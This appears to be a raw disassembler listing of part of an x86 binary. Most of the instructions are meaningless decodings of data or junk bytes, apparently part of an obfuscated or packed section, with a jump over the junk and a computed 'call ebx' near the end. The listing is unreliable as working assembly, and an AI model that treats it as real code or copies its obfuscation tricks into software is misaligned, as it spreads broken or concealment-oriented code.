  41120d:	mov    ah,0x9b
  41120f:	mov    edi,0x20bfaf8d
  411214:	mov    dh,0xb
  411216:	xchg   esp,esi
  411218:	adc    ah,ch
  41121a:	std    
  41121b:	push   es
  41121c:	mov    edi,?
  41121e:	push   ss
  41121f:	jne    0x411244
  411221:	sub    ebp,DWORD PTR [esi]
  411223:	(bad)  
  411224:	cmc    
  411225:	je     0x411225
  411227:	sbb    ah,al
  411229:	imul   edx,DWORD PTR [ecx+0x606fc3c7],0xc33506b0
  411233:	inc    DWORD PTR [edx-0x1a5c5a75]
  411239:	sub    al,0x87
  41123b:	sub    ebx,ecx
  41123d:	xor    BYTE PTR [esi+0x65],bl
  411240:	(bad)  
  411241:	(bad)  
  411242:	je     0x41124f
  411244:	push   eax
  411245:	ss aas 
  411247:	inc    eax
  411248:	mov    ?,WORD PTR [eax+0x418dc438]
  41124e:	pop    ecx
  41124f:	dec    edi
  411250:	mov    dl,BYTE PTR [bx+si]
  411253:	cmp    DWORD PTR [edx],0x17
  411256:	call   0xf502ca75
  41125b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41125c:	mov    eax,ds:0x7322b6c2
  411261:	repz dec ebx
  411263:	cmp    esp,DWORD PTR cs:[ebx+0x2d]
  411267:	mov    bh,0x21
  411269:	cdq    
  41126a:	sbb    eax,0x7ab921d2
  41126f:	pop    eax
  411270:	movntps XMMWORD PTR ds:0x6b026562,xmm2
  411277:	call   DWORD PTR [eax+eiz*8-0x231ea564]
  41127e:	xchg   ebp,eax
  41127f:	mov    al,ds:0xdf4f7b0d
  411284:	mov    ds:0x76a6a8fe,eax
  411289:	cmp    ch,BYTE PTR [esi+0x75f9d1e5]
  41128f:	xchg   edx,eax
  411290:	mov    bh,0x55
  411292:	jae    0x4112ce
  411294:	in     eax,0x11
  411296:	mov    eax,ds:0xa7fbd495
  41129b:	mov    edx,0xec7f4f94
  4112a0:	je     0x4112bd
  4112a2:	(bad)  
  4112a3:	sti    
  4112a4:	add    edi,DWORD PTR [edx-0x2d]
  4112a7:	sub    esi,edi
  4112a9:	cld    
  4112aa:	popa   
  4112ab:	push   esi
  4112ac:	mov    ds:0x2ca08df,al
  4112b1:	add    eax,0xe3c7cd40
  4112b6:	sub    dl,BYTE PTR [esi+0x70]
  4112b9:	or     DWORD PTR [ecx-0x23],0xffffffc1
  4112bd:	es mov esi,0x6a44cb00
  4112c3:	xchg   BYTE PTR [eax-0x76],cl
  4112c6:	jnp    0x41125f
  4112c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112c9:	and    eax,0x4b3f893
  4112ce:	xor    al,0xb3
  4112d0:	adc    al,0xdb
  4112d2:	fcmovnbe st,st(3)
  4112d4:	out    dx,eax
  4112d5:	jl     0x411333
  4112d7:	jmp    0xef6:0x89f4e792
  4112de:	add    DWORD PTR [esi+0x3b877159],ebx
  4112e4:	pusha  
  4112e5:	(bad)  
  4112e6:	jmp    0x411336
  4112e8:	jle    0x4112fb
  4112ea:	ins    DWORD PTR es:[edi],dx
  4112eb:	mov    ebx,0x93aae22
  4112f0:	or     al,BYTE PTR ds:0xfdbcf8a2
  4112f6:	add    ebp,DWORD PTR [edi+eax*1]
  4112f9:	es cdq 
  4112fb:	lahf   
  4112fc:	mov    dl,0x66
  4112fe:	mov    eax,ds:0x7edf1248
  411303:	scas   eax,DWORD PTR es:[edi]
  411304:	test   al,0x7d
  411306:	sbb    DWORD PTR [edx+0x17],0xbe43a18
  41130d:	gs or  DWORD PTR gs:[esp+ebx*8-0x5f36e994],esp
  411316:	dec    esp
  411317:	jmp    0x411332
  411319:	jnp    0x41133c
  41131b:	das    
  41131c:	sbb    bl,ch
  41131e:	dec    edi
  41131f:	fs test eax,0x939eb1c3
  411325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411326:	add    DWORD PTR [ecx-0x5b975ca0],esi
  41132c:	dec    ebx
  41132d:	and    BYTE PTR [ebp-0x28],ah
  411330:	mov    ebx,0xd6b411a3
  411335:	push   es
  411336:	mov    BYTE PTR [esi-0x1d],bl
  411339:	inc    ecx
  41133a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41133b:	or     DWORD PTR [ecx],0x66
  41133e:	out    dx,al
  41133f:	mov    eax,0xb0e047e3
  411344:	mov    eax,0x61d3739f
  411349:	mov    ds:0x3dd6b8c5,eax
  41134e:	mov    ah,0x87
  411350:	mov    BYTE PTR [ecx],al
  411352:	jnp    0x411368
  411354:	sbb    BYTE PTR [edi+0x1375472d],bh
  41135a:	mov    ebx,0x46548130
  41135f:	rol    edi,0x50
  411362:	cdq    
  411363:	push   0xb1215c56
  411368:	mov    ebp,0x382a9e3b
  41136d:	cdq    
  41136e:	and    DWORD PTR [eax+0x24],0xa0fd271b
  411375:	dec    eax
  411376:	imul   eax,DWORD PTR [edx],0x46
  411379:	daa    
  41137a:	mov    eax,0x62c21671
  41137f:	mov    bl,0xc2
  411381:	cs fucomip st,st(7)
  411384:	add    DWORD PTR ds:0x627c3aa1,0xf77ebf73
  41138e:	cli    
  41138f:	mov    al,0xd1
  411391:	xor    ebx,DWORD PTR [ebx-0x274c5a53]
  411397:	mov    eax,0x1ad5ace1
  41139c:	cmp    cl,BYTE PTR [esi+0x6bd1e09d]
  4113a2:	push   0x2
  4113a4:	lea    esp,[edx]
  4113a6:	and    eax,DWORD PTR [eax+0xeff5948]
  4113ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113ad:	jmp    0x7b540ea3
  4113b2:	aam    0xab
  4113b4:	mov    ah,0x84
  4113b6:	stos   BYTE PTR es:[edi],al
  4113b7:	in     eax,dx
  4113b8:	mov    bl,0x27
  4113ba:	mov    dh,0x93
  4113bc:	fadd   DWORD PTR [ebp+ebp*1-0x80]
  4113c0:	test   DWORD PTR [ebx],0x86c0074a
  4113c6:	push   edi
  4113c7:	jns    0x4113f6
  4113c9:	xor    BYTE PTR ds:0x5f103af7,dl
  4113cf:	sub    dh,0x8b
  4113d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113d3:	mov    edi,0xd92d4504
  4113d8:	mul    BYTE PTR [ecx-0x6e]
  4113db:	ret    0x467f
  4113de:	mov    cs,WORD PTR [edi]
  4113e0:	loopne 0x4113a5
  4113e2:	cmp    ah,BYTE PTR [ebx-0x2496b3f8]
  4113e8:	add    dl,cl
  4113ea:	adc    al,0x6b
  4113ec:	ja     0x4113c9
  4113ee:	lock fisub WORD PTR [edx-0x24]
  4113f2:	iret   
  4113f3:	add    eax,0x4be96183
  4113f8:	adc    cl,BYTE PTR [edi+0x58]
  4113fb:	std    
  4113fc:	add    edx,ecx
  4113fe:	icebp  
  4113ff:	or     BYTE PTR [eax-0x1e],ah
  411402:	xor    DWORD PTR [edx],esp
  411404:	stos   BYTE PTR es:[edi],al
  411405:	xchg   esp,eax
  411406:	int    0xeb
  411408:	pop    es
  411409:	pop    ebx
  41140a:	sub    esi,DWORD PTR [edx+edi*2+0x59]
  41140e:	in     al,0x1a
  411410:	mov    eax,ds:0x21576769
  411415:	xchg   edi,eax
  411416:	sahf   
  411417:	test   BYTE PTR [esi-0x59dca6f8],0x46
  41141e:	stc    
  41141f:	jo     0x41144a
  411421:	fdiv   st(5),st
  411423:	fsubr  DWORD PTR [esi]
  411425:	sub    ch,BYTE PTR [ebx]
  411427:	dec    ebp
  411428:	jmp    0xe43c3a7f
  41142d:	addr16 mov ch,0xb3
  411430:	loope  0x4113ee
  411432:	and    al,dl
  411434:	das    
  411435:	mov    edi,0x92b13e14
  41143a:	xor    al,0xbe
  41143c:	cmc    
  41143d:	cmp    edx,DWORD PTR [eax]
  41143f:	hlt    
  411440:	shr    DWORD PTR [ebx+0x3511f999],cl
  411446:	pop    edi
  411447:	xor    dl,BYTE PTR [esi-0x2]
  41144a:	(bad)  
  41144b:	out    0x64,al
  41144d:	xchg   DWORD PTR [esi+0x42],eax
  411450:	sbb    cl,al
  411452:	push   edi
  411453:	jp     0x411428
  411455:	jae    0x41146e
  411457:	xor    ebx,DWORD PTR [ebx+0x23]
  41145a:	fmul   st,st(5)
  41145c:	scas   al,BYTE PTR es:[edi]
  41145d:	pop    ecx
  41145e:	leave  
  41145f:	pusha  
  411460:	ja     0x41146f
  411462:	sub    BYTE PTR [ecx+0x2e],al
  411465:	cs jo  0x4114e2
  411468:	add    dl,al
  41146a:	retf   
  41146b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41146c:	out    dx,eax
  41146d:	xlat   BYTE PTR ds:[ebx]
  41146e:	dec    ebx
  41146f:	push   ds
  411470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411471:	and    bl,ah
  411473:	shr    edi,0x98
  411476:	sti    
  411477:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  411479:	std    
  41147a:	aam    0xa8
  41147c:	add    DWORD PTR [esi-0x3d9ed7c8],0x5a
  411483:	mov    esi,0x17fb6155
  411488:	mov    ds:0xc2ecb168,eax
  41148d:	add    esi,DWORD PTR ds:0x6cd1e875
  411493:	test   al,0x9a
  411495:	jne    0x411486
  411497:	push   ebp
  411498:	jp     0x41149c
  41149a:	push   0xffffffa5
  41149c:	inc    esi
  41149d:	add    bl,BYTE PTR [ecx+0x2]
  4114a0:	mov    ds:0xe28bafbe,al
  4114a5:	jg     0x411468
  4114a7:	sub    ch,BYTE PTR [ecx-0x3f6dedad]
  4114ad:	jnp    0x4114aa
  4114af:	pop    ds
  4114b0:	pop    edi
  4114b1:	adc    dl,BYTE PTR [edx-0xe339924]
  4114b7:	mov    edx,0xb77e6f44
  4114bc:	mov    ds:0xf9ee780e,al
  4114c1:	mov    esi,0x1d666f72
  4114c6:	xor    BYTE PTR [ebx-0x61],cl
  4114c9:	jp     0x411468
  4114cb:	pop    es
  4114cc:	sub    eax,DWORD PTR [ebp-0x36]
  4114cf:	std    
  4114d0:	int    0xc9
  4114d2:	pop    esp
  4114d3:	sub    al,BYTE PTR [edi+0xad41f6c]
  4114d9:	daa    
  4114da:	shr    dl,1
  4114dc:	pop    edx
  4114dd:	or     DWORD PTR [eax],ecx
  4114df:	mov    BYTE PTR [eax-0x24864cee],ah
  4114e5:	dec    ebx
  4114e6:	gs ja  0x411504
  4114e9:	data16 and bl,BYTE PTR [edi-0x2e976730]
  4114f0:	mov    dl,0xe0
  4114f2:	and    dl,BYTE PTR [edi+eiz*2+0x3bf91713]
  4114f9:	cmp    al,0xe6
  4114fb:	push   es
  4114fc:	adc    DWORD PTR [eax+0x7cc31734],edi
  411502:	jle    0x411521
  411504:	cmp    BYTE PTR [eax],dh
  411506:	mov    bh,0x60
  411508:	pop    es
  411509:	add    edi,edx
  41150b:	pop    ebx
  41150c:	test   bl,dl
  41150e:	mov    al,ds:0x2afc0f21
  411513:	stos   BYTE PTR es:[edi],al
  411514:	loopne 0x411540
  411516:	jmp    0xad9e33ec
  41151b:	test   DWORD PTR [ebp+0x76],edx
  41151e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41151f:	fcom   QWORD PTR [esi+eax*1]
  411522:	jg     0x41155c
  411524:	mov    dh,0xff
  411526:	andnps xmm3,XMMWORD PTR [ecx+0x23d03314]
  41152d:	or     al,0xaa
  41152f:	(bad)
  411533:	adc    BYTE PTR [eax+0x17],cl
  411536:	ins    BYTE PTR es:[edi],dx
  411537:	push   ecx
  411538:	adc    eax,0x21b5229c
  41153d:	mov    ebp,0x73034e25
  411542:	push   ebp
  411543:	add    BYTE PTR [edi],bl
  411545:	pop    es
  411546:	imul   eax,DWORD PTR [ecx+0x4c],0xffffffff
  41154a:	stos   DWORD PTR es:[edi],eax
  41154b:	sub    DWORD PTR [ebx+0x6],0x10
  41154f:	lahf   
  411550:	pushf  
  411551:	push   cs
  411552:	nop
  411553:	mov    al,bl
  411555:	mov    esp,edi
  411557:	cmp    ch,BYTE PTR [ebp+edi*8-0x2e]
  41155b:	jle    0x41150c
  41155d:	xor    DWORD PTR [esi+esi*2],edi
  411560:	rol    DWORD PTR [eax+0x146b1adb],1
  411566:	retf   0x2263
  411569:	xchg   edx,eax
  41156a:	out    dx,al
  41156b:	outs   dx,DWORD PTR ds:[esi]
  41156c:	add    cl,BYTE PTR [ecx-0x80]
  41156f:	lods   eax,DWORD PTR ds:[esi]
  411570:	cmp    bh,BYTE PTR [ecx]
  411572:	push   ebx
  411573:	mov    ah,0x4b
  411575:	arpl   WORD PTR [esi+edx*1-0x5dd5f2e7],cx
  41157c:	lods   al,BYTE PTR ds:[esi]
  41157d:	fs clc 
  41157f:	dec    ebp
  411580:	push   ss
  411581:	xor    al,0xef
  411583:	jecxz  0x411559
  411585:	(bad)  
  411586:	gs into 
  411588:	pop    edi
  411589:	vpmaxuq xmm3{k1},xmm7,xmm1
  41158f:	imul   BYTE PTR [edi]
  411591:	inc    ebx
  411592:	and    esi,DWORD PTR [eax+0xc3df4bc]
  411598:	add    BYTE PTR [eax-0x28be2b9],al
  41159e:	not    DWORD PTR ds:0x16e0fbb7
  4115a4:	xor    eax,0xb5e2b5d7
  4115a9:	repnz sub ebp,DWORD PTR [edx]
  4115ac:	ret    0xd97f
  4115af:	loopne 0x4115fc
  4115b1:	add    dh,BYTE PTR [edi-0x12772764]
  4115b7:	repz mov edx,DWORD PTR [eax]
  4115ba:	(bad)  
  4115bb:	cld    
  4115bc:	outs   dx,BYTE PTR ds:[esi]
  4115bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115be:	dec    ebp
  4115bf:	pop    ebx
  4115c0:	es jnp 0x4115f1
  4115c3:	popa   
  4115c4:	sbb    esp,DWORD PTR [edi+ebx*2]
  4115c7:	enter  0xb75a,0x58
  4115cb:	xchg   ah,bl
  4115cd:	cdq    
  4115ce:	jae    0x4115e8
  4115d0:	lahf   
  4115d1:	jno    0x41164f
  4115d3:	xchg   ebx,eax
  4115d4:	nop
  4115d5:	cs adc esi,0x5f
  4115d9:	sbb    al,0xce
  4115db:	outs   dx,DWORD PTR ds:[esi]
  4115dc:	cmp    al,0x5
  4115df:	mov    dh,0xa
  4115e1:	mov    edx,DWORD PTR [ebp+0x14]
  4115e4:	xor    eax,ecx
  4115e6:	add    eax,esi
  4115e8:	imul   eax,DWORD PTR [edx]
  4115eb:	mov    edx,DWORD PTR [ebp-0x4]
  4115ee:	xor    edx,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4115f3:	lea    ecx,[edx+ecx*1+0x32729c]
  4115fa:	cmp    ecx,eax
  4115fc:	jmp    0x4119f0
  411601:	mov    ebx,0x93838448
  411606:	push   ebx
  411607:	mov    ebx,0x78da0248
  41160c:	bound  esi,QWORD PTR [esi-0x11acc011]
  411612:	inc    eax
  411613:	jo     0x411685
  411615:	dec    ecx
  411616:	jge    0x411688
  411618:	jo     0x4115bd
  41161a:	in     eax,dx
  41161b:	and    dh,BYTE PTR ds:0x6409b1d3
  411621:	(bad)  
  411622:	adc    eax,0x4f450a98
  411627:	adc    eax,0x4343754f
  41162c:	mov    esi,0x97dad829
  411631:	aaa    
  411632:	or     ebx,esp
  411634:	adc    al,0x3e
  411636:	aad    0xdb
  411638:	push   es
  411639:	in     eax,0xa2
  41163b:	test   al,0xe0
  41163d:	dec    ebx
  41163e:	cli    
  41163f:	pop    es
  411640:	sahf   
  411641:	mov    ebx,0x3f852579
  411646:	push   esi
  411647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411648:	mov    cl,0x25
  41164a:	dec    ebp
  41164b:	adc    ebx,DWORD PTR [edx+0x2a]
  41164e:	cmp    eax,0xf76b0fb8
  411653:	mov    edi,0xf1bf3215
  411658:	lds    edx,FWORD PTR [edi+0xe]
  41165b:	pop    ebp
  41165c:	lds    edx,FWORD PTR [ecx-0xd81cb73]
  411662:	xor    esi,DWORD PTR [edx-0x1de7c3e5]
  411668:	pop    esp
  411669:	cmp    dh,al
  41166b:	ja     0x41160a
  41166d:	jmp    0x411619
  41166f:	xchg   bl,ah
  411671:	inc    DWORD PTR [eax]
  411673:	inc    edx
  411674:	lods   al,BYTE PTR ds:[esi]
  411675:	mov    BYTE PTR ds:0x58725a7e,dh
  41167b:	push   ebp
  41167c:	fwait
  41167d:	(bad)  
  41167e:	fst    DWORD PTR [edi-0x60ad32e9]
  411684:	sbb    eax,0xe9a80819
  411689:	adc    al,0xfa
  41168b:	call   0x62d0:0x770de7cb
  411692:	pop    ss
  411693:	mov    ah,BYTE PTR [ecx-0x1d]
  411696:	lods   al,BYTE PTR ds:[esi]
  411697:	hlt    
  411698:	mov    cl,0x73
  41169a:	mov    esi,esp
  41169c:	xchg   ebp,eax
  41169d:	pop    ebx
  41169e:	std    
  41169f:	outs   dx,DWORD PTR ds:[esi]
  4116a0:	adc    dl,al
  4116a2:	xor    cl,dl
  4116a4:	fsubr  st,st(0)
  4116a6:	mov    WORD PTR [edi-0x35cc576d],fs
  4116ac:	cmc    
  4116ad:	dec    ebx
  4116ae:	fisttp QWORD PTR [eax-0x911ce65]
  4116b4:	call   0x4393:0x5130ffe2
  4116bb:	ins    BYTE PTR es:[edi],dx
  4116bc:	add    ch,BYTE PTR ds:0xcab3f6cf
  4116c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116c3:	pop    ebx
  4116c4:	dec    esi
  4116c5:	sbb    DWORD PTR [edi],esp
  4116c7:	push   esp
  4116c8:	das    
  4116c9:	push   edi
  4116ca:	adc    cl,BYTE PTR [esi-0x4c63d3a]
  4116d0:	clc    
  4116d1:	jecxz  0x41173b
  4116d3:	in     eax,dx
  4116d4:	or     esp,DWORD PTR [ecx-0x1370803b]
  4116da:	cwde   
  4116db:	mov    eax,ds:0x25389e0b
  4116e0:	dec    esp
  4116e1:	dec    ebx
  4116e2:	fmul   DWORD PTR [edx]
  4116e4:	adc    WORD PTR [edx-0x55d463c1],di
  4116eb:	cld    
  4116ec:	sub    ch,BYTE PTR [ecx-0xe163c0d]
  4116f2:	jbe    0x4116c0
  4116f4:	dec    ecx
  4116f5:	dec    edx
  4116f6:	mov    DWORD PTR [ecx],ebp
  4116f8:	or     eax,0xcf3eb162
  4116fd:	add    DWORD PTR [ebx+0x4c],ecx
  411700:	(bad)  
  411701:	out    dx,al
  411702:	(bad)  
  411703:	lds    ecx,FWORD PTR [ecx]
  411705:	jecxz  0x4116a6
  411707:	mov    bh,0xc2
  411709:	data16 (bad) 
  41170b:	sbb    DWORD PTR [ecx],ecx
  41170d:	fsub   QWORD PTR [ebx-0x588990e5]
  411713:	sub    eax,0x26276b2
  411718:	xor    al,0x30
  41171a:	xchg   esp,eax
  41171b:	clc    
  41171c:	or     eax,0x8cd71280
  411721:	xor    ebx,DWORD PTR [ebx+0x19]
  411724:	gs cdq 
  411726:	fsubrp st(3),st
  411728:	and    ecx,ecx
  41172a:	xchg   ebp,eax
  41172b:	pop    es
  41172c:	inc    esp
  41172d:	in     eax,0xe7
  41172f:	or     DWORD PTR [ecx+0x225b4d0f],esp
  411735:	aad    0x1e
  411737:	ss inc edx
  411739:	push   edi
  41173a:	imul   ecx,DWORD PTR [ecx-0x4266e7ed],0xffffffe1
  411741:	std    
  411742:	or     DWORD PTR ds:0xfb6999e,edi
  411748:	(bad)
  41174c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41174d:	adc    al,0x5c
  41174f:	cmc    
  411750:	pop    ds
  411751:	jb     0x411765
  411753:	dec    ebp
  411754:	jnp    0x4116f3
  411756:	dec    esi
  411757:	out    dx,al
  411758:	mov    ch,0x2a
  41175a:	jecxz  0x4117c5
  41175c:	push   esi
  41175d:	mov    DWORD PTR [esi+0x1f],esp
  411760:	dec    edx
  411761:	(bad)  
  411762:	lock fist DWORD PTR [ebx-0x276532b6]
  411769:	out    dx,al
  41176a:	add    eax,0xacfb5fb2
  41176f:	popf   
  411770:	jl     0x4117d5
  411772:	dec    edx
  411773:	hlt    
  411774:	jne    0x411770
  411776:	in     al,0x61
  411778:	xor    BYTE PTR ds:0x5b985a14,al
  41177e:	ds xchg esp,eax
  411780:	sbb    DWORD PTR ds:0xe8a0a48d,ebx
  411786:	mov    dl,0xca
  411788:	repnz xor eax,0x96c851f8
  41178e:	stos   BYTE PTR es:[edi],al
  41178f:	mov    ebx,0x45f1fa3a
  411794:	cmc    
  411795:	jg     0x4117a1
  411797:	mov    ch,0xf6
  411799:	daa    
  41179a:	pop    ebp
  41179b:	shl    DWORD PTR [edi+ecx*2+0x3c],1
  41179f:	mov    ds:0x5ae49984,eax
  4117a4:	lods   eax,DWORD PTR ds:[esi]
  4117a5:	shl    DWORD PTR [eax+0x3c],1
  4117a8:	push   0xec6042d6
  4117ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117ae:	daa    
  4117af:	retf   
  4117b0:	cmp    al,0xf9
  4117b2:	loop   0x4117b4
  4117b4:	xchg   cl,bh
  4117b6:	pop    ebp
  4117b7:	pusha  
  4117b8:	sbb    eax,DWORD PTR [eax+0x2]
  4117bb:	mov    WORD PTR [esi],ds
  4117bd:	bound  ebx,QWORD PTR [ebx+0x69]
  4117c0:	sbb    ch,dh
  4117c2:	test   DWORD PTR [edx+ecx*2-0xe101dca],ecx
  4117c9:	fwait
  4117ca:	xor    BYTE PTR ds:0x89c6fc53,bl
  4117d0:	loope  0x41176b
  4117d2:	add    al,0x80
  4117d4:	xor    bl,dl
  4117d6:	or     esi,edx
  4117d8:	mov    esi,0x662a0030
  4117dd:	jae    0x411795
  4117df:	outs   dx,BYTE PTR ds:[esi]
  4117e0:	xchg   ebx,eax
  4117e1:	mov    eax,0xc573b633
  4117e6:	cld    
  4117e7:	push   edi
  4117e8:	add    al,0x44
  4117ea:	mov    al,ds:0xdf9a3732
  4117ef:	jne    0x4117c4
  4117f1:	inc    ecx
  4117f2:	prefetch BYTE PTR [ebp+0x48bb8e58]
  4117f9:	sbb    eax,0xce596da6
  4117fe:	lea    edi,[ebp-0x31054d4a]
  411804:	sub    DWORD PTR [edx+edi*1-0x29],edx
  411808:	dec    eax
  411809:	std    
  41180a:	loope  0x411884
  41180c:	pop    esp
  41180d:	stc    
  41180e:	loopne 0x411838
  411810:	sbb    eax,0x24bd97d6
  411815:	sub    BYTE PTR [ebx-0x4bbb7620],al
  41181b:	and    BYTE PTR [esi+0x46],dl
  41181e:	jle    0x4117ab
  411820:	push   0xcdf4ceb6
  411825:	dec    ecx
  411826:	jl     0x41181e
  411828:	and    al,0x34
  41182a:	and    BYTE PTR [ebx],bh
  41182c:	push   es
  41182d:	jmp    0x411806
  41182f:	xchg   ebx,eax
  411830:	mov    eax,es
  411832:	(bad)  
  411833:	out    0x48,al
  411835:	push   ds
  411836:	sub    bl,bh
  411838:	push   esi
  411839:	test   DWORD PTR [edx+0x6df8b4dd],esp
  41183f:	pop    ecx
  411840:	ins    BYTE PTR es:[edi],dx
  411841:	or     BYTE PTR [eax-0x35ba38fb],cl
  411847:	pushf  
  411848:	dec    esp
  411849:	inc    ebx
  41184a:	fisttp WORD PTR [edi-0x2e]
  41184d:	ret    0x48bf
  411850:	mov    ah,0x6e
  411852:	loop   0x411801
  411854:	push   0x3cfdc7a5
  411859:	dec    ebx
  41185a:	mov    BYTE PTR [ebx],ah
  41185c:	into   
  41185d:	test   ebp,ebx
  41185f:	not    dh
  411861:	jmp    0x411880
  411863:	leave  
  411864:	jecxz  0x411814
  411866:	pop    ss
  411867:	dec    esp
  411868:	xor    BYTE PTR [edi+ecx*4-0x781b176f],al
  41186f:	pushf  
  411870:	push   ds
  411871:	test   BYTE PTR [edi-0xfb5ebd0],bl
  411877:	dec    eax
  411878:	int    0xb0
  41187a:	push   ecx
  41187b:	gs jo  0x411818
  41187e:	mov    cl,0xe
  411880:	(bad)  
  411882:	adc    cl,BYTE PTR [ebp+0x4c]
  411885:	fwait
  411886:	rol    DWORD PTR [eax],1
  411888:	mov    ds,WORD PTR [bp+si-0x14]
  41188c:	(bad)  
  41188d:	icebp  
  41188e:	arpl   sp,di
  411890:	jp     0x41189e
  411892:	xor    BYTE PTR gs:[esi-0x11],dh
  411896:	jno    0x411847
  411898:	aad    0xf
  41189a:	or     ebx,ecx
  41189c:	cwde   
  41189d:	or     BYTE PTR ds:0x72038dd6,0xac
  4118a4:	outs   dx,DWORD PTR ds:[esi]
  4118a5:	daa    
  4118a6:	arpl   WORD PTR [ecx+0x6ce3779d],di
  4118ac:	dec    esi
  4118ad:	add    cl,BYTE PTR [edi+0x6a08c226]
  4118b3:	xchg   edi,eax
  4118b4:	mov    DWORD PTR ds:0x9210c6e0,ecx
  4118ba:	test   DWORD PTR [ecx+0x2a14db07],edi
  4118c0:	fdiv   st(4),st
  4118c2:	stc    
  4118c3:	cld    
  4118c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118c5:	inc    esi
  4118c6:	mul    DWORD PTR [edx]
  4118c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118c9:	and    eax,0xc3586ee6
  4118ce:	div    BYTE PTR [eax+0x1b7fa149]
  4118d4:	into   
  4118d5:	inc    edi
  4118d6:	cmp    cl,BYTE PTR [edx]
  4118d8:	mov    esi,0x8039b17e
  4118dd:	inc    esi
  4118de:	jmp    0x411947
  4118e0:	add    dh,BYTE PTR [esi+0x568df5b6]
  4118e6:	or     ebp,edx
  4118e8:	mov    ecx,0x71f0d88a
  4118ed:	outs   dx,BYTE PTR ds:[esi]
  4118ee:	sbb    BYTE PTR [ebp+0x6a205256],0xf5
  4118f5:	cli    
  4118f6:	out    dx,eax
  4118f7:	sbb    al,0x56
  4118f9:	pop    edx
  4118fa:	pop    edx
  4118fb:	mov    BYTE PTR [edx+0x59bc14a6],0xf7
  411902:	inc    ebp
  411903:	fs cs test al,0x29
  411907:	push   ebx
  411908:	bound  ebp,QWORD PTR [ecx-0x2a334f45]
  41190e:	dec    ebp
  41190f:	pop    ds
  411910:	jg     0x411904
  411912:	imul   edx,edx,0x57e26645
  411918:	scas   al,BYTE PTR es:[edi]
  411919:	add    BYTE PTR [ebx+0x6d],dl
  41191c:	nop
  41191d:	xlat   BYTE PTR ds:[ebx]
  41191e:	mov    dl,0x8f
  411920:	mov    ds:0x2e76a6bc,al
  411925:	xchg   DWORD PTR [edi+edi*8+0x7a2e5f84],edx
  41192c:	mov    ds:0xbdcab40b,eax
  411931:	mov    cl,0x35
  411933:	ror    BYTE PTR [ebx-0x70f83b32],1
  411939:	jns    0x41196a
  41193b:	test   eax,0x68e9389f
  411940:	arpl   sp,dx
  411942:	inc    ebx
  411943:	or     dh,BYTE PTR [eax+0x63]
  411946:	add    ebx,ecx
  411948:	jmp    0x411942
  41194a:	sbb    eax,0x15fa4aa8
  41194f:	inc    eax
  411950:	xchg   esp,eax
  411951:	dec    BYTE PTR [ecx]
  411953:	or     eax,0xfb42573a
  411958:	ret    0xccdb
  41195b:	add    DWORD PTR [eax],ecx
  41195d:	es test eax,0x3c4be57e
  411963:	inc    ecx
  411964:	mov    esp,0x80dcd98e
  411969:	mov    dl,0xb9
  41196b:	push   ds
  41196c:	cli    
  41196d:	mov    ebx,0xe1151a0d
  411972:	jo     0x41192b
  411974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411975:	sbb    ecx,DWORD PTR [edx]
  411977:	pop    edx
  411978:	test   BYTE PTR [esi-0x5f015e8b],0x8c
  41197f:	test   eax,0xdba3ce36
  411984:	inc    ebx
  411985:	out    0x9d,eax
  411987:	ret    0x5c65
  41198a:	push   ebp
  41198b:	sub    eax,eax
  41198d:	mov    ch,0x93
  41198f:	mov    cl,0x4d
  411992:	dec    eax
  411993:	lock ja 0x411957
  411996:	in     eax,0x33
  411998:	daa    
  411999:	mov    eax,ds:0x9fbc3fc6
  41199e:	pop    esi
  41199f:	mov    ebp,0x60ae8acd
  4119a4:	add    eax,0xe7bc961c
  4119a9:	aas    
  4119aa:	test   eax,0x29144354
  4119af:	es scas al,BYTE PTR es:[edi]
  4119b1:	xchg   esi,eax
  4119b2:	inc    ecx
  4119b3:	mov    eax,ds:0xa083f548
  4119b8:	pop    esi
  4119b9:	mov    ebp,0x5f3eba2
  4119be:	mov    eax,0x230fb312
  4119c3:	push   es
  4119c4:	scas   eax,DWORD PTR es:[edi]
  4119c5:	dec    DWORD PTR [edx+ebx*8]
  4119c8:	xor    ch,bh
  4119ca:	mov    edx,0x701a8391
  4119cf:	jo     0x411973
  4119d1:	ds stos BYTE PTR es:[edi],al
  4119d3:	imul   esi,esi,0x8
  4119d6:	out    dx,al
  4119d7:	cmp    al,0x47
  4119d9:	fimul  WORD PTR [eax+0x3ad37262]
  4119df:	out    0x3,eax
  4119e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119e2:	popf   
  4119e3:	or     esp,DWORD PTR [edx-0x75]
  4119e6:	imul   ebp,edx,0xffffffef
  4119e9:	sub    BYTE PTR [ecx+0x2187eba9],dl
  4119ef:	mov    edx,0xefc6850f
  4119f4:	(bad)  
  4119f5:	dec    DWORD PTR [ebx+0x5e9de]
  4119fb:	add    BYTE PTR [eax],al
  4119fd:	mov    ebx,0x32729c
  411a02:	mov    eax,DWORD PTR [ebp-0x4]
  411a05:	xor    eax,0x7510855
  411a0a:	add    eax,ebx
  411a0c:	mov    DWORD PTR [ebp-0xc],eax
  411a0f:	xor    ebx,ebx
  411a11:	lea    eax,[ebp-0x10]
  411a14:	add    ebx,DWORD PTR [eax]
  411a16:	call   ebx
  411a18:	xor    ebx,ebx
  411a1a:	inc    ebx
  411a1b:	cmp    DWORD PTR [ebp+0x10],ebx
  411a1e:	je     0x411e30
  411a24:	xchg   edx,eax
  411a25:	push   0xa
